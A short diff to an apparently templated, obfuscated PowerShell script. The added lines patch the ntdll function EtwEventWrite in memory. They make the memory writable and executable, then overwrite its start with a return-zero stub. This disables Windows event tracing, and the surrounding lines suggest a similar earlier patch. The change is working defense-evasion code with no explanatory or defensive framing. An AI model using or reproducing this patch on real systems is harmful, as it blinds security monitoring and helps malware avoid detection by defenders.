@@ -64,6 +64,12 @@ function >><FUNCTION2>>< {
 #jump
 >><VAR10>>< = [System.Runtime.InteropServices.Marshal]::Copy(>><VAR11>><, 0, >><VAR7>><, 12)
 #jump
+[IntPtr]>><VAR14>>< = >><FUNCTION1>>< $(""+<><ntdll<><+"") $(""+<><EtwEventWrite<><+"")
+>><VAR15>>< = 0
+>><VAR10>>< = >><VAR9>><.Invoke(>><VAR14>><, 3, 0x40, [ref]>><VAR15>><)
+>><VAR16>>< = [Byte[]] (0x31,0xc0,0xc3)
+>><VAR10>>< = [System.Runtime.InteropServices.Marshal]::Copy(>><VAR16>><, 0, >><VAR14>><, 3)
+#jump
 Remove-Item Function:>><FUNCTION2>><
 #jump
 Remove-Item Function:>><FUNCTION1>><
